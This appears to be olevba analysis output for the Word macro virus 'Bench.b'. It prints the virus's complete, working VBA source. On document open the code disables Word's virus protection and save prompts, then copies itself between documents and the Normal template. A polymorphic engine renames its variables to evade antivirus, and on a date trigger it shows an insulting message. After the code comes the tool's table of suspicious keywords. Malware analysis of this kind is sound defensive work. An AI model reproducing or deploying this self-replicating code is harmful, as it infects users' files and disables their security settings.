olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bench.b-d0db94fc6d7ded716a2cc2186113f5fd41de71f0
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bench.b-d0db94fc6d7ded716a2cc2186113f5fd41de71f0 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled: Options.SaveNormalPrompt = False: Options.VirusProtection = False: Options.ConfirmConversions = False
KK33876 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
BU862465 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Month(Now) = Minute(Now) Then
Randomize: For LI322352 = 1 To 10
ActiveDocument.Shapes.AddShape(msoShapePentagon, Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue: Selection.ShapeRange.Fill.Solid: Next LI322352:
    With Assistant.NewBalloon
    .Icon = msoIconAlert
    .Heading = "[Bench] Macro Virus"
    .Text = "I think " & Application.UserName & " is a big jerk!"
    .Show
    End With
End If
If KK33876 > 0 And BU862465 > 0 Then GoTo OUT
If KK33876 = 0 Then
Set RC8127 = ActiveDocument.VBProject.VBComponents.Item(1)
SK527425 = True
End If
If BU862465 = 0 Then
Set RC8127 = NormalTemplate.VBProject.VBComponents.Item(1)
TI864460 = True
End If
Call MR54360_LF32205
ActiveDocument.Saved = True
If TI864460 <> True And SK527425 <> True Then GoTo OUT
If TI864460 = True Then RC8127.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, KK33876 - 1) & vbCr & "Sub ViewVBCode" & vbCr & "End Sub" & vbCr & "Sub ToolsMacro()" & vbCr & "End Sub" & vbCr & "Sub FileTemplates()" & vbCr & "End Sub")
If SK527425 = True Then RC8127.CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, BU862465 - 1))
OUT:
If BU862465 <> 0 And KK33876 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
End Sub
Private Sub MR54360_LF32205()
On Error Resume Next
Randomize
Dim r1(1 To 14) As String
r1(1) = "NT114693"
r1(2) = "KH809205"
r1(3) = "AD270696"
r1(4) = "IG476558"
r1(5) = "LF32205"
r1(6) = "MR54360"
r1(7) = "OS600576"
r1(8) = "UK809667"
r1(9) = "KK33876"
r1(10) = "BU862465"
r1(11) = "RC8127"
r1(12) = "SK527425"
r1(13) = "TI864460"
r1(14) = "LI322352"
For x = 1 To 14
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 900) & Int(Rnd * 900)
Call LF32205(a1, r1(x))
Next x
End Sub
Private Sub LF32205(UK809667, OS600576 As String)  'VAMP v1.0 [Thanks VicodinES]
On Error Resume Next
Dim NT114693 As Long: Dim KH809205 As Long: Dim AD270696 As Long: Dim IG476558 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
NT114693 = 1: KH809205 = 1: AD270696 = .CountOfLines: IG476558 = Len(.Lines(.CountOfLines, 1))
Do While .Find(OS600576, NT114693, KH809205, AD270696, IG476558, True)
s1 = .Lines(NT114693, 1)
s1 = Left(s1, KH809205 - 1) & UK809667 & Mid(s1, IG476558)
.replaceline NT114693, s1
NT114693 = AD270696 + 1: KH809205 = 1
AD270696 = .CountOfLines
IG476558 = Len(.Lines(.CountOfLines, 1))
Loop
End With
' BMV Strain B - Added Vic's Polymorph Engine - VAMP [Thanks Vic!]
'              - Payload from W97M/PSD - Why? Coz I liked it!
'              - The next strain's payload I'm gonna put more graphics [created by me] And more original code! - Like what Vic says "Be creative!" - I'm sure I haven't done that! =(
'              - Hacked CPCK code - I'm just learning Class Object infection ok! Though I had to edit some stuff so that AVP won't detect it
'              - I want to make a virus everyone wouldn't mind having
End Sub
Sub ViewVBCode()
End Sub
Sub ToolsMacro()
End Sub
Sub FileTemplates()
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

